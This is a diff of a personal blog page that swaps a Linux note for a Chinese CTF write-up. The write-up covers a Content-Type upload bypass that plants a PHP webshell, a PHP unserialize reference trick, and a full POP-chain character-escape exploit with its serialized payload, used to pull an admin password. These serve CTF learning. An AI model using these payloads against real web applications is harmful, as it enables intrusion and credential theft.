@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="adduser, 更好的明天">
+    <meta name="keywords" content="更好的明天">
     <meta name="description" content="打ACM和CTF，未来的人上人，嘿嘿">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>adduser | 更好的明天</title>
+    <title>更好的明天</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">adduser</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-15
+                    2022-09-03
                 </div>
                 
 
@@ -452,14 +452,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    28
+                    821
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    4 分
                 </div>
                 
 
@@ -482,13 +482,178 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h1><ol>
-<li>root</li>
-<li>普通 home</li>
-<li>访客 <h2 id="访客不能切到root"><a href="#访客不能切到root" class="headerlink" title="访客不能切到root"></a>访客不能切到root</h2></li>
-<li>出于系统保护</li>
+                <h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><ol>
+<li><p>  文件类型绕过攻击</p>
+</li>
+<li><p>  打开代理，和burpsuit走一个端口</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903193634.png"></p>
+</li>
+<li><p>  随意发一个文件，抓包</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903193730.png"></p>
+</li>
+<li><p>  将Content-Type修改为 image/gif</p>
+</li>
+<li><p>  Content-Type决定了服务器以什么方式解读文件，且Content-Type是客户端可以修改的</p>
+</li>
+<li><p>  以image/gif的方式上传一句话木马</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903194220.png"></p>
+</li>
+<li><p>  链接蚁剑，在根目录找到flag</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903194402.png"></p>
+</li>
+<li><p>  打开即可获得flag</p>
+</li>
+<li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903194416.png"></p>
+</li>
 </ol>
-<h1 id="区分文件和文件夹"><a href="#区分文件和文件夹" class="headerlink" title="区分文件和文件夹"></a>区分文件和文件夹</h1>
+<h1 id="midserialize"><a href="#midserialize" class="headerlink" title="midserialize"></a>midserialize</h1><ol>
+<li><p>```php</p>
+  <?php
+  error_reporting(0);
+  include('flag.php');
+  highlight_file(__FILE__);
+  class Sxsec{
+      public $token;
+      public $password;
+  
+      public function __construct($t,$p){
+          $this->token=$t;
+          $this->password = $p;
+      }
+      public function login(){
+          return $this->token===$this->password;
+      }
+  }
+  
+  $sxsec = unserialize($_GET['sxsec']);
+  $sxsec->token=md5(mt_rand());
+  
+  if($sxsec ->login()){
+   
+      echo $flag;
+  }else{
+  
+  echo "NO";
+  }
+  
+  
+  ?>  <pre class="line-numbers language-none"><code class="language-none">
+2.   看到题目是unserialize,需要serialize一下
+
+3.   &#96;&#96;&#96;php
+     &lt;?php
+     class Sxsec&#123;
+         public $token&#x3D;&#39;lin&#39;;
+         public $password;
+         public function __construct($t,$p)&#123;
+         $this-&gt;token&#x3D;&amp;$this-&gt;password;
+     &#125;
+     &#125;
+     $pop&#x3D;new Sxsec();
+     echo urlencode(serialize($pop));
+     ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>  得到</p>
+</li>
+<li><p>```php<br>  O%3A5%3A%22Sxsec%22%3A2%3A%7Bs%3A5%3A%22token%22%3BN%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D&amp;a[]=a&amp;b[]=b&amp;c=0e215962017</p>
+  <pre class="line-numbers language-none"><code class="language-none">
+6.   get传参传给sxsec即可获得flag
+
+7.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220903195743.png)
+
+
+
+# 40300
+
+1.   try to flag.txt
+2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220903195821.png)
+3.   在url后面拼接flag.txt
+4.   访问得到flag
+5.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220903195923.png)
+
+
+
+# 40315
+
+1.   第一步：打开网页，dirsearch扫到了www.zip审计源码,有个safe方法可以进行字符逃逸
+
+2.   &#96;&#96;&#96;
+     function safe($parm)&#123;
+         $array&#x3D; array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);
+         return str_replace($array,&#39;hacker&#39;,$parm);
+     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li><p>第二步：</p>
+<p>  寻找pop链，可以利用UpdateHelper的__destruct触发User的__toString然后走到Info的__call方法，在__call中调用了dbCtrl类的login方法，通过控制查询语句，把admin账户的密码查出来</p>
+</li>
+<li><pre><code class="php">  &lt;?php
+   class *User*
+   &#123;
+     public $age=&#39;select password,id from user where username=?&#39;;
+     public $nickname=null;
+   &#125;
+   class *Info*&#123;
+     public $age;
+     public $nickname;
+     public $CtrlCase;
+   &#125;
+   class *UpdateHelper*
+   &#123;
+     public $sql;
+   &#125;
+   class *dbCtrl*
+   &#123;
+     public $hostname = &quot;127.0.0.1&quot;;
+     public $dbuser=&quot;noob123&quot;;
+     public $dbpass=&quot;noob123&quot;;
+     public $database=&quot;noob123&quot;;
+     public $name=&#39;admin&#39;;
+     public $token = &#39;admin&#39;;
+   &#125;
+  
+   function post($data)&#123;
+     $data = http_build_query($data);
+     $opts = array (
+       &#39;http&#39; =&gt; array (
+         &#39;method&#39; =&gt; &#39;POST&#39;,
+         &#39;header&#39;=&gt; &quot;Content-type: application/x-www-form-urlencoded\r\n&quot; .
+           &quot;Content-Length: &quot; . strlen($data) . &quot;\r\n&quot;,
+         &#39;content&#39; =&gt; $data
+       )
+     );
+     $html = file_get_contents(&#39;http://127.0.0.1:8085/index.php?action=update&#39;, false, stream_context_create($opts));
+     echo $html;
+   &#125;
+  
+   $x = new UpdateHelper();
+   $x-&gt;sql = new User();
+   $x-&gt;sql-&gt;nickname = new Info();
+   $x-&gt;sql-&gt;nickname-&gt;CtrlCase = new dbCtrl();
+  
+   $p = &#39;&quot;;s:8:&quot;CtrlCase&quot;;&#39; . serialize($x) . &quot;&#125;&quot;;
+   $p = str_repeat(&#39;union&#39;, strlen($p)).$p;
+   echo($p);
+  
+   post([
+     &#39;age&#39; =&gt; 123,
+     &#39;nickname&#39; =&gt; $p
+   ]);
+  <pre class="line-numbers language-none"><code class="language-none">
+payload:
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+  unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;
+</code></pre>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903205337.png"></p>
+</li>
+<li><p>  得到密码后，登录得到flag</p>
+</li>
+<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903210434.png"></p>
+</li>
+</ol>
+
                 
             </div>
             <hr/>
@@ -514,7 +679,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.strongwill.top/adduser/">https://www.strongwill.top/adduser/</a>
+                    <a href="https://www.strongwill.top/Upload/">https://www.strongwill.top/Upload/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -719,66 +884,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/ctfhub%E7%9A%84%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/">
+                <a href="/Upload/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="ctfhub的默认口令">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">ctfhub的默认口令</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-20
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="背包问题">
-                        
-                        <span class="card-title">背包问题</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -789,18 +906,52 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-03
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            syk
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="vue学习笔记">
+                        
+                        <span class="card-title">vue学习笔记</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-31
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/acm%E7%AE%97%E6%B3%95/" class="post-category">
-                                    acm算法
-                                </a>
-                            
-                            <a href="/categories/acm%E7%AE%97%E6%B3%95/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/" class="post-category">
-                                    背包问题
+                            <a href="/categories/vue/" class="post-category">
+                                    vue
                                 </a>
                             
                             
@@ -810,12 +961,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/acm%E7%AE%97%E6%B3%95/">
-                        <span class="chip bg-color">acm算法</span>
+                    <a href="/tags/vue/">
+                        <span class="chip bg-color">vue</span>
                     </a>
                     
-                    <a href="/tags/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/">
-                        <span class="chip bg-color">背包问题</span>
+                    <a href="/tags/%E5%89%8D%E7%AB%AF/">
+                        <span class="chip bg-color">前端</span>
                     </a>
                     
                 </div>
@@ -1014,7 +1165,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">93.9k</span>&nbsp;字
+                class="white-color">108.7k</span>&nbsp;字
             
             
             
